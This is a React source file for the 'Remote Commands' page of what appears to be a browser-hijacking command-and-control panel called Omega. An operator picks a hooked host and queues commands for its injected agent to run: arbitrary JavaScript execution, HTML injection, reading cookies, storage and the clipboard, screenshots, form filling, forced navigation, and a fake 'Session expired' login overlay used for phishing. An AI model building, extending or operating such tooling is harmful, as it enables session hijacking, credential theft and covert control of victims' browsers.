// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { useState } from "react";
import { Layout } from "@/components/layout";
import { useListHosts } from "@workspace/omega-api-client-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import {
  TerminalSquare, Globe, Code2, Database, Cookie, FileText, Code, Camera,
  Edit, MousePointerClick, Navigation, Bell, Layers, Clipboard, ClipboardList,
  RefreshCw, Cpu
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const BASE = "/api/omega";

type RCmd = { id: number; hostId: number; commandType: string; params: string; status: string; result: string; executedAt: string };

type CommandDef = {
  type: string;
  label: string;
  icon: React.ElementType;
  group: string;
  paramLabel?: string;
  paramPlaceholder?: string;
  multiline?: boolean;
  dangerous?: boolean;
};

const COMMANDS: CommandDef[] = [
  { type: "eval_js",        label: "Execute JS",        icon: Code2,          group: "Execution", paramLabel: "JavaScript", paramPlaceholder: "document.title" },
  { type: "inject_html",    label: "Inject HTML",        icon: Code,           group: "Execution", paramLabel: "HTML to inject", paramPlaceholder: "<div>injected</div>", multiline: true },
  { type: "get_dom",        label: "Capture DOM",        icon: FileText,       group: "Recon" },
  { type: "read_storage",   label: "Read Storage",       icon: Database,       group: "Recon" },
  { type: "read_cookies",   label: "Read Cookies",       icon: Cookie,         group: "Recon" },
  { type: "get_forms",      label: "List Forms",         icon: FileText,       group: "Recon" },
  { type: "get_scripts",    label: "List Scripts",       icon: Cpu,            group: "Recon" },
  { type: "take_screenshot",label: "Screen Capture",     icon: Camera,         group: "Screen" },
  { type: "fill_form",      label: "Fill Form",          icon: Edit,           group: "Input", paramLabel: 'JSON {selector: value}', paramPlaceholder: '{"#email":"test@test.com"}' },
  { type: "click_element",  label: "Click Element",      icon: MousePointerClick, group: "Input", paramLabel: "CSS selector", paramPlaceholder: "#submit-btn" },
  { type: "navigate_url",   label: "Navigate URL",       icon: Navigation,     group: "Navigation", paramLabel: "URL", paramPlaceholder: "https://example.com", dangerous: true },
  { type: "show_alert",     label: "Show Alert",         icon: Bell,           group: "UI", paramLabel: "Message", paramPlaceholder: "Security test message" },
  { type: "show_overlay",   label: "Inject Overlay",     icon: Layers,         group: "UI", paramLabel: "Overlay HTML", paramPlaceholder: "<h1>Session expired. Please log in again.</h1>", multiline: true, dangerous: true },
  { type: "read_clipboard", label: "Read Clipboard",     icon: ClipboardList,  group: "Clipboard" },
  { type: "set_clipboard",  label: "Set Clipboard",      icon: Clipboard,      group: "Clipboard", paramLabel: "Text to write", paramPlaceholder: "payload content" },
];

const GROUPS = ["Execution", "Recon", "Screen", "Input", "Navigation", "UI", "Clipboard"];

const STATUS_COLOR: Record<string, string> = {
  pending:  "border-yellow-500/40 text-yellow-400",
  sent:     "border-blue-500/40 text-blue-400",
  executed: "border-green-500/40 text-green-400",
};

async function fetchHistory(hostId: number): Promise<RCmd[]> {
  const r = await fetch(`${BASE}/remote-commands/${hostId}`);
  if (!r.ok) throw new Error("Failed");
  return r.json();
}

async function execCommand(hostId: number, commandType: string, params: string) {
  const r = await fetch(`${BASE}/remote-commands/${hostId}/execute`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ commandType, params }),
  });
  if (!r.ok) throw new Error("Failed");
  return r.json();
}

function CommandCard({ cmd, onExec }: { cmd: CommandDef; onExec: (type: string, params: string) => void }) {
  const [param, setParam] = useState("");
  const Icon = cmd.icon;

  return (
    <div className={`border rounded-md p-3 flex flex-col gap-2 bg-card/40 ${cmd.dangerous ? "border-red-500/30" : "border-border/50"} hover:bg-muted/10`}>
      <div className="flex items-center gap-2">
        <Icon className={`h-4 w-4 shrink-0 ${cmd.dangerous ? "text-red-400" : "text-primary"}`} />
        <span className="font-mono text-sm font-medium">{cmd.label}</span>
      </div>
      {cmd.paramLabel && (
        cmd.multiline ? (
          <Textarea
            value={param}
            onChange={e => setParam(e.target.value)}
            placeholder={cmd.paramPlaceholder}
            className="text-xs font-mono bg-black/20 border-border/50 min-h-[60px] resize-y"
          />
        ) : (
          <Input
            value={param}
            onChange={e => setParam(e.target.value)}
            placeholder={cmd.paramPlaceholder}
            className="h-7 text-xs font-mono bg-black/20 border-border/50"
          />
        )
      )}
      <Button
        size="sm"
        variant={cmd.dangerous ? "destructive" : "outline"}
        className={`h-7 text-xs w-full ${!cmd.dangerous ? "border-primary/30 text-primary hover:bg-primary/10" : ""}`}
        onClick={() => onExec(cmd.type, param)}
      >
        Queue Command
      </Button>
    </div>
  );
}

export default function RemoteCommands() {
  const [selectedHostId, setSelectedHostId] = useState<number | null>(null);
  const { data: hosts } = useListHosts();
  const qc = useQueryClient();
  const { toast } = useToast();

  const { data: history, isLoading, refetch } = useQuery({
    queryKey: ["remote-commands", selectedHostId],
    queryFn: () => fetchHistory(selectedHostId!),
    enabled: !!selectedHostId,
    refetchInterval: 3000,
  });

  const execMut = useMutation({
    mutationFn: ({ type, params }: { type: string; params: string }) => execCommand(selectedHostId!, type, params),
    onSuccess: () => {
      qc.invalidateQueries({ queryKey: ["remote-commands", selectedHostId] });
      toast({ title: "Command queued", description: "Agent will execute on next poll (≤3s)" });
    },
    onError: () => {
      toast({ title: "Failed to queue command", variant: "destructive" });
    },
  });

  const handleExec = (type: string, params: string) => {
    const cmd = COMMANDS.find(c => c.type === type);
    if (cmd?.dangerous) {
      if (!window.confirm(`Send "${cmd.label}" to the remote agent?`)) return;
    }
    execMut.mutate({ type, params });
  };

  const selectedHost = hosts?.find(h => h.id === selectedHostId);

  return (
    <Layout>
      <div className="space-y-6">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
          <div>
            <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
              <TerminalSquare className="h-7 w-7 text-primary" /> Remote Commands
            </h1>
            <p className="text-muted-foreground mt-1">Queue web commands for live Omega agents to execute.</p>
          </div>
          <div className="flex items-center gap-2">
            <Select value={selectedHostId?.toString() ?? ""} onValueChange={v => setSelectedHostId(parseInt(v))}>
              <SelectTrigger className="w-[200px]"><SelectValue placeholder="Select a host..." /></SelectTrigger>
              <SelectContent>
                {hosts?.map(h => (
                  <SelectItem key={h.id} value={h.id.toString()}>
                    <span className="flex items-center gap-2">
                      <span className={`w-2 h-2 rounded-full inline-block ${h.status === "online" ? "bg-green-500" : h.status === "offline" ? "bg-red-500" : "bg-gray-500"}`} />
                      {h.label}
                    </span>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {selectedHostId && (
              <Button variant="outline" size="icon" onClick={() => refetch()} title="Refresh history">
                <RefreshCw className="h-4 w-4" />
              </Button>
            )}
          </div>
        </div>

        {!selectedHostId ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">Select a host to execute remote commands.</CardContent>
          </Card>
        ) : (
          <div className="space-y-6">
            {selectedHost?.status !== "online" && (
              <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-md p-3 text-yellow-400 text-sm">
                Host is <strong>{selectedHost?.status ?? "unknown"}</strong>. Commands will queue but won't execute until the Omega agent is deployed and connected. Click the <strong>Agent</strong> button on the Hosts page to get the payload script.
              </div>
            )}

            {GROUPS.map(group => {
              const cmds = COMMANDS.filter(c => c.group === group);
              return (
                <div key={group}>
                  <p className="text-[10px] font-semibold text-muted-foreground/60 tracking-widest mb-2 uppercase">{group}</p>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
                    {cmds.map(cmd => (
                      <CommandCard key={cmd.type} cmd={cmd} onExec={handleExec} />
                    ))}
                  </div>
                </div>
              );
            })}

            <Card className="bg-card/40 border-border">
              <CardHeader className="flex flex-row items-center justify-between">
                <CardTitle className="text-sm text-muted-foreground">Command Queue / History</CardTitle>
                <span className="text-xs text-muted-foreground/50">Auto-refreshes every 3s</span>
              </CardHeader>
              <CardContent>
                {isLoading ? (
                  <div className="space-y-2">{[...Array(5)].map((_, i) => <div key={i} className="h-10 bg-muted/20 rounded animate-pulse" />)}</div>
                ) : !history || history.length === 0 ? (
                  <p className="text-center text-muted-foreground text-sm py-8">No commands queued yet.</p>
                ) : (
                  <div className="space-y-1 max-h-80 overflow-y-auto font-mono text-xs">
                    {history.map(h => {
                      const cmd = COMMANDS.find(c => c.type === h.commandType);
                      const Icon = cmd?.icon ?? TerminalSquare;
                      const colorClass = STATUS_COLOR[h.status] ?? "border-muted-foreground/30 text-muted-foreground";
                      return (
                        <div key={h.id} className="border border-border/20 rounded p-2 space-y-1 hover:bg-muted/10">
                          <div className="flex items-center gap-2">
                            <Icon className="h-3.5 w-3.5 text-primary shrink-0" />
                            <span className="text-primary font-semibold">{h.commandType}</span>
                            {h.params && <span className="text-muted-foreground truncate max-w-xs">{h.params.substring(0, 60)}</span>}
                            <span className="ml-auto text-muted-foreground/40 shrink-0">{new Date(h.executedAt).toLocaleTimeString()}</span>
                            <Badge variant="outline" className={`text-[9px] shrink-0 ${colorClass}`}>{h.status}</Badge>
                          </div>
                          {h.result && (
                            <p className="text-muted-foreground/70 pl-5 truncate" title={h.result}>
                              → {h.result.substring(0, 120)}
                            </p>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </Layout>
  );
}
